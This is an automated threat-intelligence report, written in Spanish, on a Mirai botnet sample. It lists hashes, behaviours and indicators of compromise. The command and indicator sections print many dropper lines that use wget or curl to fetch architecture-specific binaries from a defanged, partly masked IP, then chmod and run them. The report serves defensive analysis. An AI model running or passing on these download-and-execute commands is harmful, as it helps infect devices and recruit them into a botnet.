# 🧬 Payload Analysis

`a7aa8ae207287377e68c266e15cd415dcfefc4a9844c7c235ac02af7ef267ed5`

## 📌 Resumen

Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos, Ejecución. Se identificaron 24 comandos observados o extraídos. Se identificaron 37 indicadores técnicos.


## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai`
- **Confianza de familia:** `Media`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:00:23.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `a7aa8ae207287377e68c266e15cd415dcfefc4a9844c7c235ac02af7ef267ed5`
- **SHA1:** `07d5fcd19fcb0de9a5a885b2bb3b9cbd6554d1a4`
- **MD5:** `dd1b9dc620ec8bd7bd470d2a724824e2`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 3.3 KiB |
| Entropía | 5.07 |
| Strings | 44 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=10

## 🖥️ Comandos observados / extraídos

```text
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm; chmod 777 vcimanagement.arm; ./vcimanagement.arm android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm5; chmod 777 vcimanagement.arm5; ./vcimanagement.arm5 android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm6; chmod 777 vcimanagement.arm6; ./vcimanagement.arm6 android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm7; chmod 777 vcimanagement.arm7; ./vcimanagement.arm7 android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.m68k; chmod 777 vcimanagement.m68k; ./vcimanagement.m68k android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.mips; chmod 777 vcimanagement.mips; ./vcimanagement.mips android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.mpsl; chmod 777 vcimanagement.mpsl; ./vcimanagement.mpsl android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.ppc; chmod 777 vcimanagement.ppc; ./vcimanagement.ppc android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.sh4; chmod 777 vcimanagement.sh4; ./vcimanagement.sh4 android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.spc; chmod 777 vcimanagement.spc; ./vcimanagement.spc android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.x86; chmod 777 vcimanagement.x86; ./vcimanagement.x86 android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.x86_64; chmod 777 vcimanagement.x86_64; ./vcimanagement.x86_64 andr
curl hxxp://141.11.88.XXX/bins/vcimanagement.arm; chmod 777 vcimanagement.arm; ./vcimanagement.arm android
curl hxxp://141.11.88.XXX/bins/vcimanagement.arm5; chmod 777 vcimanagement.arm5; ./vcimanagement.arm5 android
curl hxxp://141.11.88.XXX/bins/vcimanagement.arm6; chmod 777 vcimanagement.arm6; ./vcimanagement.arm6 android
curl hxxp://141.11.88.XXX/bins/vcimanagement.arm7; chmod 777 vcimanagement.arm7; ./vcimanagement.arm7 android
curl hxxp://141.11.88.XXX/bins/vcimanagement.m68k; chmod 777 vcimanagement.m68k; ./vcimanagement.m68k android
curl hxxp://141.11.88.XXX/bins/vcimanagement.mips; chmod 777 vcimanagement.mips; ./vcimanagement.mips android
curl hxxp://141.11.88.XXX/bins/vcimanagement.mpsl; chmod 777 vcimanagement.mpsl; ./vcimanagement.mpsl android
curl hxxp://141.11.88.XXX/bins/vcimanagement.ppc; chmod 777 vcimanagement.ppc; ./vcimanagement.ppc android
curl hxxp://141.11.88.XXX/bins/vcimanagement.sh4; chmod 777 vcimanagement.sh4; ./vcimanagement.sh4 android
curl hxxp://141.11.88.XXX/bins/vcimanagement.spc; chmod 777 vcimanagement.spc; ./vcimanagement.spc android
curl hxxp://141.11.88.XXX/bins/vcimanagement.x86; chmod 777 vcimanagement.x86; ./vcimanagement.x86 android
curl hxxp://141.11.88.XXX/bins/vcimanagement.x86_64; chmod 777 vcimanagement.x86_64; ./vcimanagement.x86_64 android
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.arm7; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.ppc; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.sh4; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.m68k; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.arm6; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.mips; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.x86_64; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.x86; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.arm5; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.spc; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.mpsl; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.arm; | strings |
| ip | 141.11.88.XXX | static_analysis |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm; chmod 777 vcimanagement.arm; ./vcimanagement.arm android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm5; chmod 777 vcimanagement.arm5; ./vcimanagement.arm5 android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm6; chmod 777 vcimanagement.arm6; ./vcimanagement.arm6 android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm7; chmod 777 vcimanagement.arm7; ./vcimanagement.arm7 android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.m68k; chmod 777 vcimanagement.m68k; ./vcimanagement.m68k android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.mips; chmod 777 vcimanagement.mips; ./vcimanagement.mips android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.mpsl; chmod 777 vcimanagement.mpsl; ./vcimanagement.mpsl android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.ppc; chmod 777 vcimanagement.ppc; ./vcimanagement.ppc android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.sh4; chmod 777 vcimanagement.sh4; ./vcimanagement.sh4 android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.spc; chmod 777 vcimanagement.spc; ./vcimanagement.spc android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.x86; chmod 777 vcimanagement.x86; ./vcimanagement.x86 android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.x86_64; chmod 777 vcimanagement.x86_64; ./vcimanagement.x86_64 andr | strings |
| command | curl hxxp://141.11.88.XXX/bins/vcimanagement.arm; chmod 777 vcimanagement.arm; ./vcimanagement.arm android | strings |
| command | curl hxxp://141.11.88.XXX/bins/vcimanagement.arm5; chmod 777 vcimanagement.arm5; ./vcimanagement.arm5 android | strings |
| command | curl hxxp://141.11.88.XXX/bins/vcimanagement.arm6; chmod 777 vcimanagement.arm6; ./vcimanagement.arm6 android | strings |
| command | curl hxxp://141.11.88.XXX/bins/vcimanagement.arm7; chmod 777 vcimanagement.arm7; ./vcimanagement.arm7 android | strings |
| command | curl hxxp://141.11.88.XXX/bins/vcimanagement.m68k; chmod 777 vcimanagement.m68k; ./vcimanagement.m68k android | strings |
| command | curl hxxp://141.11.88.XXX/bins/vcimanagement.mips; chmod 777 vcimanagement.mips; ./vcimanagement.mips android | strings |
| command | curl hxxp://141.11.88.XXX/bins/vcimanagement.mpsl; chmod 777 vcimanagement.mpsl; ./vcimanagement.mpsl android | strings |
| command | curl hxxp://141.11.88.XXX/bins/vcimanagement.ppc; chmod 777 vcimanagement.ppc; ./vcimanagement.ppc android | strings |
| command | curl hxxp://141.11.88.XXX/bins/vcimanagement.sh4; chmod 777 vcimanagement.sh4; ./vcimanagement.sh4 android | strings |
| command | curl hxxp://141.11.88.XXX/bins/vcimanagement.spc; chmod 777 vcimanagement.spc; ./vcimanagement.spc android | strings |
| command | curl hxxp://141.11.88.XXX/bins/vcimanagement.x86; chmod 777 vcimanagement.x86; ./vcimanagement.x86 android | strings |
| command | curl hxxp://141.11.88.XXX/bins/vcimanagement.x86_64; chmod 777 vcimanagement.x86_64; ./vcimanagement.x86_64 android | strings |
| hash | a7aa8ae207287377e68c266e15cd415dcfefc4a9844c7c235ac02af7ef267ed5 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | html response |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
